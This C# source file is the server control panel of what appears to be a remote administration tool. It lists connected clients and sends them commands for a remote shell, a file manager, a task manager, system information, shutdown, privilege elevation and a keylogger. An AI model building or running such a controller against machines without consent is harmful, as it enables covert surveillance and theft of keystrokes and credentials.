using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using Common.Enums;
using Common.Networking;
using Common.Utils;
using Server.Handlers;
using Server.Networking;
using Server.Services;

namespace Server.Forms
{
    public partial class MainServerForm : Form
    {
        private ServerListener? _listener;
        private readonly ConcurrentDictionary<string, ServerClientConnection> _clients = new ConcurrentDictionary<string, ServerClientConnection>();
        private readonly PacketHandler _packetHandler;
        private readonly SystemInfoHandler _systemInfoHandler = new SystemInfoHandler();
        private readonly RemoteShellHandler _remoteShellHandler = new RemoteShellHandler();
        private readonly FileManagerHandler _fileManagerHandler = new FileManagerHandler();
        private readonly MessageBoxHandler _messageBoxHandler = new MessageBoxHandler();
        private readonly ShutdownActionHandler _shutdownActionHandler = new ShutdownActionHandler();
        private readonly Dictionary<string, KeyLoggerForm> _keyLoggerForms = new Dictionary<string, KeyLoggerForm>();
        private readonly Dictionary<string, Server.Handlers.KeyLoggerHandler> _keyLoggerHandlers = new Dictionary<string, Server.Handlers.KeyLoggerHandler>();
        private readonly TaskManagerHandler _taskManagerHandler = new TaskManagerHandler();
        private readonly CommandService _commandService = new CommandService();
        private readonly BindingSource _clientsBinding = new BindingSource();

        public MainServerForm()
        {
            InitializeComponent();
            _packetHandler = new PacketHandler(OnSystemInfoResponse, OnRemoteShellResponse, OnFileManagerResponse, OnMessageBoxResponse, OnShutdownActionResponse,
				OnTaskManagerResponse,
				onKeyLoggerEvent: OnKeyLoggerEvent,
                onKeyLoggerBatch: OnKeyLoggerBatch,
                onKeyLoggerComboEvent: OnKeyLoggerComboEvent);
            InitializeClientsGrid();
        }

        private void OnSystemInfoResponse(SystemInfoResponse response)
        {
            if (!string.IsNullOrEmpty(response.ClientId))
            {
                _systemInfoHandler.SaveLastResponse(response.ClientId, response);
            }
            AppendLog($"[{DateTime.Now:HH:mm:ss}] [RECV] SystemInfoResponse");
            RefreshClientsGrid();
            // Auto-open corresponding form if this was the last requested for that client (best-effort: open overview when full)
            if (!string.IsNullOrEmpty(response.ClientId) && response.Payload != null)
            {
                // If only hardware was requested
                if (response.Payload.Hardware != null && response.Payload.Network == null && response.Payload.Software == null)
                {
                    new HardwareInfoForm(response.Payload.Hardware).Show();
                }
                else if (response.Payload.Software != null && response.Payload.Hardware == null && response.Payload.Network == null)
                {
                    new SoftwareInfoForm(response.Payload.Software).Show();
                }
                else if (response.Payload.Network != null && response.Payload.Hardware == null && response.Payload.Software == null)
                {
                    new NetworkInfoForm(response.Payload.Network).Show();
                }
                else
                {
                    new SystemInfoForm(response.Payload).Show();
                }
            }
        }

        private void OnRemoteShellResponse(RemoteShellResponse response)
        {
            if (!string.IsNullOrEmpty(response.ClientId))
            {
                _remoteShellHandler.SaveLastResponses(response.ClientId, response);
            }
            AppendLog($"[{DateTime.Now:HH:mm:ss}] [RECV] RemoteShellResponse from {response.ClientId}");
        }
        private void OnMessageBoxResponse(MessageBoxResponse response)
        {
            if (!string.IsNullOrEmpty(response.ClientId))
            {
                _messageBoxHandler.SaveLastResponses(response.ClientId, response);
            }
            AppendLog($"[{DateTime.Now:HH:mm:ss}] [RECV] MessageBoxResponse from {response.ClientId}");
        }
        private void OnShutdownActionResponse(ShutdownActionResponse response)
        {
            if (!string.IsNullOrEmpty(response.ClientId))
            {
                _shutdownActionHandler.SaveLastResponses(response.ClientId, response);
            }
            AppendLog($"[{DateTime.Now:HH:mm:ss}] [RECV] ActionResponse from {response.ClientId}");
        }
        private void OnFileManagerResponse(FileManagerResponse response)
        {
            if (!string.IsNullOrEmpty(response.ClientId))
            {
                _fileManagerHandler.SaveLastResponse(response.ClientId, response);
            }
            AppendLog($"[{DateTime.Now:HH:mm:ss}] [RECV] FileManagerResponse from {response.ClientId}");
        }

        private void OnTaskManagerResponse (TaskManagerResponse response)
		{
			if (!string.IsNullOrEmpty(response.ClientId))
			{
				_taskManagerHandler.SaveLastResponse(response.ClientId, response);
				// Nếu có OperationResult từ client, raise event để UI nhận trạng thái hành động
				if (response.Payload?.OperationResult != null)
				{
					_taskManagerHandler.NotifyOperationCompleted(response.Payload.OperationResult);
				}
			}
			AppendLog($"[{DateTime.Now:HH:mm:ss}] [RECV] TaskManagerResponse from {response.ClientId}");
		}

		private void StartServer(int port)
        {
            _listener = new ServerListener(IPAddress.Any, port);
            _listener.OnClientConnected += conn =>
            {
                _clients[conn.Id] = conn;
                conn.OnLineReceived += (id, line) => _packetHandler.HandleLine(line);
                conn.OnDisconnected += id => _clients.TryRemove(id, out _);
                AppendLog($"[{DateTime.Now:HH:mm:ss}] [INFO] Client connected: {conn.Id}");
                RefreshClientsGrid();
            };
            _listener.Start();
            lblStatus.ForeColor = Color.Green;
            lblStatus.Text = $"Server running on port {port}";
            AppendLog($"[{DateTime.Now:HH:mm:ss}] [INFO] Listening on port {port}");
            btnStartStop.Text = "Stop Server";
        }

        private void StopServer()
        {
            _listener?.Stop();
            _clients.Clear();
            lblStatus.ForeColor = Color.Red;
            lblStatus.Text = "Server stopped";
            btnStartStop.Text = "Start Server";
            AppendLog($"[{DateTime.Now:HH:mm:ss}] [INFO] Server stopped");
            RefreshClientsGrid();
        }

        private void btnStartStop_Click(object sender, EventArgs e)
        {
            if (_listener == null)
            {
                if (int.TryParse(txtPort.Text, out var port))
                {
                    StartServer(port);
                }
                else
                {
                    MessageBox.Show("Invalid port");
                }
            }
            else
            {
                StopServer();
                _listener = null;
            }
        }

        private void btnChangePort_Click(object sender, EventArgs e)
        {
            if (_listener != null)
            {
                MessageBox.Show("Stop server before changing port");
                return;
            }
            AppendLog($"[{DateTime.Now:HH:mm:ss}] [INFO] Port set to {txtPort.Text}");
        }

        private void hardwareInfoToolStripMenuItem_Click(object sender, EventArgs e)
        {
            var conn = GetSelectedConnection();
            if (conn == null) return;
            var includeHardware = true; var includeNetwork = false; var includeSoftware = false;
            _ = _commandService.SendSystemInfoRequestAsync(conn, includeHardware, includeNetwork, includeSoftware);
            AppendLog($"[{DateTime.Now:HH:mm:ss}] [SEND] SystemInfoRequest to {conn.Id} (Hardware)");
            OpenIfCached(conn.Id, hardware: true);
        }

        private void softwareInfoToolStripMenuItem_Click(object sender, EventArgs e)
        {
            var conn = GetSelectedConnection();
            if (conn == null) return;
            _ = _commandService.SendSystemInfoRequestAsync(conn, false, false, true);
            AppendLog($"[{DateTime.Now:HH:mm:ss}] [SEND] SystemInfoRequest to {conn.Id} (Software)");
            OpenIfCached(conn.Id, software: true);
        }

        private void networkInfoToolStripMenuItem_Click(object sender, EventArgs e)
        {
            var conn = GetSelectedConnection();
            if (conn == null) return;
            _ = _commandService.SendSystemInfoRequestAsync(conn, false, true, false);
            AppendLog($"[{DateTime.Now:HH:mm:ss}] [SEND] SystemInfoRequest to {conn.Id} (Network)");
            OpenIfCached(conn.Id, network: true);
        }

        private void remoteShellToolStripMenuItem_Click(object sender, EventArgs e)
        {
            var conn = GetSelectedConnection();
            if (conn == null) return;

            var remoteShellForm = RemoteShellForm.CreateNewOrGetExisting(conn, _remoteShellHandler);
            remoteShellForm.Show();
            AppendLog($"[{DateTime.Now:HH:mm:ss}] [INFO] Opened Remote Shell for {conn.Id}");
        }
        private void messageBoxToolStripMenuItem_Click(object sender, EventArgs e)
        {
            var selectedClients = GetSelectedClients();

            if (selectedClients.Count == 0)
            {
                MessageBox.Show("Vui lòng chọn ít nhất một client!", "Thông báo");
                return;
            }

            if (selectedClients.Count == 1)
            {
                var conn = selectedClients[0];
                var messageBoxForm = MessageBoxForm.CreateNewOrGetExisting(conn, _messageBoxHandler);
                messageBoxForm.Show(this);
                AppendLog($"[{DateTime.Now:HH:mm:ss}] [INFO] Opened Message Box for {conn.Id}");
            }
            else
            {
                var messageBoxForm = new MessageBoxForm(_messageBoxHandler);
                messageBoxForm.Show(this); // set Owner = MainServerForm
                AppendLog($"[{DateTime.Now:HH:mm:ss}] [INFO] Opened Broadcast Message Box for {selectedClients.Count} clients");
            }
        }
        private void ShutdownToolStripMenuItem_Click(object sender, EventArgs e)
        {
            var conn = GetSelectedConnection();
            if (conn == null) return;

            var request = new ShutdownActionRequest
            {
                RequestId = Guid.NewGuid().ToString(),
                Action = ShutdownAction.Shutdown
            };

            AppendLog($"[{DateTime.Now:HH:mm:ss}] [SEND] Shutdown request to {conn.Id}");
            var json = JsonHelper.Serialize(request);
            _ = conn.SendAsync(json);
        }

        private void RestartToolStripMenuItem_Click(object sender, EventArgs e)
        {
            var conn = GetSelectedConnection();
            if (conn == null) return;

            var request = new ShutdownActionRequest
            {
                RequestId = Guid.NewGuid().ToString(),
                Action = ShutdownAction.Restart
            };

            AppendLog($"[{DateTime.Now:HH:mm:ss}] [SEND] Restart request to {conn.Id}");
            var json = JsonHelper.Serialize(request);
            _ = conn.SendAsync(json); 
        }

        private void StandbyToolStripMenuItem_Click(object sender, EventArgs e)
        {
            var conn = GetSelectedConnection();
            if (conn == null) return;

            var request = new ShutdownActionRequest
            {
                RequestId = Guid.NewGuid().ToString(),
                Action = ShutdownAction.Standby
            };

            AppendLog($"[{DateTime.Now:HH:mm:ss}] [SEND] Standby request to {conn.Id}");
            var json = JsonHelper.Serialize(request);
            _ = conn.SendAsync(json);
        }
        private async void ElevateToolStripMenuItem_Click(object sender, EventArgs e)
        {
            var conn = GetSelectedConnection();
            if (conn == null) return;

            var request = new ShutdownActionRequest
            {
                RequestId = Guid.NewGuid().ToString(),
                Action = ShutdownAction.Elevate,
            };

            AppendLog($"[{DateTime.Now:HH:mm:ss}] [SEND] Elevate request to {conn.Id}");
            var json = JsonHelper.Serialize(request);
            await conn.SendAsync(json);
        }

        private async void DisconnectToolStripMenuItem_Click(object sender, EventArgs e)
        {
            var conn = GetSelectedConnection();
            if (conn == null) return;

            var request = new ShutdownActionRequest
            {
                RequestId = Guid.NewGuid().ToString(),
                Action = ShutdownAction.Disconnect
            };

            AppendLog($"[{DateTime.Now:HH:mm:ss}] [SEND] Disconnect request to {conn.Id}");
            var json = JsonHelper.Serialize(request);
            await conn.SendAsync(json);
            if (_clients.TryRemove(conn.Id, out _))
            {
                conn.Disconnect();
                RefreshClientsGrid();
            }
        }

        private void OnKeyLoggerEvent(KeyLoggerEvent evt)
        {
            if (!string.IsNullOrEmpty(evt.ClientId))
            {
                if (_keyLoggerHandlers.TryGetValue(evt.ClientId, out var h)) h.OnKeyLoggerEvent(evt);
            }
        }

        private void OnKeyLoggerComboEvent(KeyLoggerComboEvent evt)
        {
            if (!string.IsNullOrEmpty(evt.ClientId))
            {
                if (_keyLoggerHandlers.TryGetValue(evt.ClientId, out var h)) h.OnKeyLoggerCombo(evt);
            }
        }

        private void OnKeyLoggerBatch(KeyLoggerBatch batch)
        {
            if (!string.IsNullOrEmpty(batch.ClientId))
            {
                if (_keyLoggerHandlers.TryGetValue(batch.ClientId, out var h)) h.OnKeyLoggerBatch(batch);
            }
        }

        private void keyLoggerStartParallelToolStripMenuItem_Click(object sender, EventArgs e)
        {
            var conn = GetSelectedConnection();
            if (conn == null) return;
            EnsureKeyLoggerForm(conn.Id);
            _keyLoggerForms[conn.Id].Show();
            var req = new KeyLoggerStart { Payload = new Common.Models.KeyLoggerStartPayload { Mode = Common.Models.KeyLoggerMode.Parallel } };
            _ = _commandService.SendKeyLoggerStartAsync(conn, req);
            AppendLog($"[{DateTime.Now:HH:mm:ss}] [SEND] KeyLoggerStart Parallel to {conn.Id}");
            _keyLoggerForms[conn.Id].ShowRealtimeOnly();
        }

        private void keyLoggerStartContinuousToolStripMenuItem_Click(object sender, EventArgs e)
        {
            var conn = GetSelectedConnection();
            if (conn == null) return;
            EnsureKeyLoggerForm(conn.Id);
            _keyLoggerForms[conn.Id].Show();
            var req = new KeyLoggerStart { Payload = new Common.Models.KeyLoggerStartPayload { Mode = Common.Models.KeyLoggerMode.Continuous, MaxChars = 100, MaxIntervalMs = 10000 } };
            _ = _commandService.SendKeyLoggerStartAsync(conn, req);
            AppendLog($"[{DateTime.Now:HH:mm:ss}] [SEND] KeyLoggerStart Continuous to {conn.Id}");
            _keyLoggerForms[conn.Id].ShowContinuousOnly();
        }

        private void EnsureKeyLoggerForm(string clientId)
        {
            if (!_keyLoggerForms.TryGetValue(clientId, out var form) || form.IsDisposed)
            {
                form = new KeyLoggerForm();
                _keyLoggerForms[clientId] = form;
                _keyLoggerHandlers[clientId] = new Server.Handlers.KeyLoggerHandler(form);
                form.OnLanguageModeChanged += vie =>
                {
                    if (_clients.TryGetValue(clientId, out var conn))
                    {
                        var ctrl = new RemoteShellRequest(); // reuse envelope not ideal; better: add explicit control packet later
                        // Instead of sending a new packet type, we send a KeyLoggerStart with same mode to toggle language client-side
                        var klStart = new KeyLoggerStart { Payload = new Common.Models.KeyLoggerStartPayload { Mode = Common.Models.KeyLoggerMode.Parallel } };
                        // We do not restart; we send a small hint via RemoteShellRequest is wrong; skip sending control here.
                    }
                };
                form.FormClosed += (s, e) =>
                {
                    _keyLoggerForms.Remove(clientId);
                    _keyLoggerHandlers.Remove(clientId);
                    if (_clients.TryGetValue(clientId, out var conn))
                    {
                        var req = new KeyLoggerStop();
                        _ = _commandService.SendKeyLoggerStopAsync(conn, req);
                        AppendLog($"[{DateTime.Now:HH:mm:ss}] [SEND] KeyLoggerStop to {clientId}");
                    }
                };
                form.OnLanguageModeChanged += vie =>
                {
                    if (_clients.TryGetValue(clientId, out var conn))
                    {
                        var toggle = new KeyLoggerLangToggle { Vietnamese = vie, ClientId = clientId };
                        var json = Common.Utils.JsonHelper.Serialize(toggle);
                        _ = conn.SendAsync(json);
                        AppendLog($"[{DateTime.Now:HH:mm:ss}] [SEND] KeyLoggerLangToggle {(vie ? "VIE" : "ENG")} to {clientId}");
                    }
                };
            }
        }

        // stop menu removed; stopping is handled when per-client form closes

        private void fileManagerToolStripMenuItem_Click(object sender, EventArgs e)
        {
            var conn = GetSelectedConnection();
            if (conn == null) return;

            var fileManagerForm = FileManagerForm.CreateNewOrGetExisting(conn, _fileManagerHandler);
            fileManagerForm.Show();
            AppendLog($"[{DateTime.Now:HH:mm:ss}] [INFO] Opened File Manager for {conn.Id}");
        }

		private void taskManagerToolStripMenuItem_Click(object sender, EventArgs e)
		{
			var conn = GetSelectedConnection();
			if (conn == null) return;

			var taskManagerForm = TaskManagerForm.CreateNewOrGetExisting(conn, _taskManagerHandler);
			taskManagerForm.Show();
			AppendLog($"[{DateTime.Now:HH:mm:ss}] [INFO] Opened Task Manager for {conn.Id}");
		}

		private void OpenIfCached(string clientId, bool hardware = false, bool software = false, bool network = false)
        {
            if (_systemInfoHandler.TryGetLastResponse(clientId, out var resp) && resp?.Payload != null)
            {
                if (hardware && resp.Payload.Hardware != null)
                {
                    new HardwareInfoForm(resp.Payload.Hardware).Show();
                }
                if (software && resp.Payload.Software != null)
                {
                    new SoftwareInfoForm(resp.Payload.Software).Show();
                }
                if (network && resp.Payload.Network != null)
                {
                    new NetworkInfoForm(resp.Payload.Network).Show();
                }
            }
        }

        private ServerClientConnection? GetSelectedConnection()
        {
            if (dgvClients.CurrentRow?.DataBoundItem is ClientRow row)
            {
                if (row != null && _clients.TryGetValue(row.FullClientId, out var conn)) return conn;
            }
            return null;
        }

        private void AppendLog(string line)
        {
            if (txtLog.InvokeRequired)
            {
                txtLog.BeginInvoke(new Action(() => AppendLog(line)));
                return;
            }
            txtLog.AppendText(line + Environment.NewLine);
        }

        private sealed class ClientRow
        {
            public bool Selected { get; set; }
            public string ClientId { get; set; } = string.Empty; // short display
            public string FullClientId { get; set; } = string.Empty; // for lookups
            public string Hostname { get; set; } = string.Empty;
            public string IpAddress { get; set; } = string.Empty;
            public DateTime ConnectedAt { get; set; }
            public DateTime LastSeen { get; set; }
            public string Status { get; set; } = "Online";
        }
        public List<ServerClientConnection> GetSelectedClients()
        {
            var selectedClients = new List<ServerClientConnection>();

            foreach (DataGridViewRow row in dgvClients.SelectedRows)
            {
                if (row.DataBoundItem is ClientRow clientRow)
                {
                    if (_clients.TryGetValue(clientRow.FullClientId, out var conn))
                    {
                        selectedClients.Add(conn);
                    }
                }
            }

            return selectedClients;
        }


        private void InitializeClientsGrid()
        {
            dgvClients.AutoGenerateColumns = false;
            dgvClients.Columns.Clear();
     
            dgvClients.Columns.Add(new DataGridViewTextBoxColumn { HeaderText = "Client ID", DataPropertyName = "ClientId", Width = 220 });
            dgvClients.Columns.Add(new DataGridViewTextBoxColumn { HeaderText = "Hostname", DataPropertyName = "Hostname", Width = 180 });
            dgvClients.Columns.Add(new DataGridViewTextBoxColumn { HeaderText = "IP Address", DataPropertyName = "IpAddress", Width = 160 });
            dgvClients.Columns.Add(new DataGridViewTextBoxColumn { HeaderText = "Connected At", DataPropertyName = "ConnectedAt", Width = 180 });
            dgvClients.Columns.Add(new DataGridViewTextBoxColumn { HeaderText = "Last Seen", DataPropertyName = "LastSeen", Width = 180 });
            dgvClients.Columns.Add(new DataGridViewTextBoxColumn { HeaderText = "Status", DataPropertyName = "Status", Width = 80 });

            var hiddenFull = new DataGridViewTextBoxColumn { HeaderText = "FullId", DataPropertyName = "FullClientId", Visible = false };
            dgvClients.Columns.Add(hiddenFull);
            dgvClients.SelectionMode = DataGridViewSelectionMode.FullRowSelect;
            dgvClients.MultiSelect = true;  
            dgvClients.ReadOnly = true;     
            dgvClients.DataSource = _clientsBinding;
            RefreshClientsGrid();
        }


        private void RefreshClientsGrid()
        {
            if (dgvClients.InvokeRequired)
            {
                dgvClients.BeginInvoke(new Action(RefreshClientsGrid));
                return;
            }

            var rows = new List<ClientRow>();
            foreach (var kv in _clients)
            {
                var c = kv.Value;
                rows.Add(new ClientRow
                {
                    ClientId = kv.Key.Length > 8 ? kv.Key.Substring(0, 8) : kv.Key,
                    FullClientId = kv.Key,
                    Hostname = "-",
                    IpAddress = c.RemoteAddress,
                    ConnectedAt = c.ConnectedAt,
                    LastSeen = c.ConnectedAt,
                    Status = "Online"
                });
            }
            _clientsBinding.DataSource = rows;
        }
    }
}
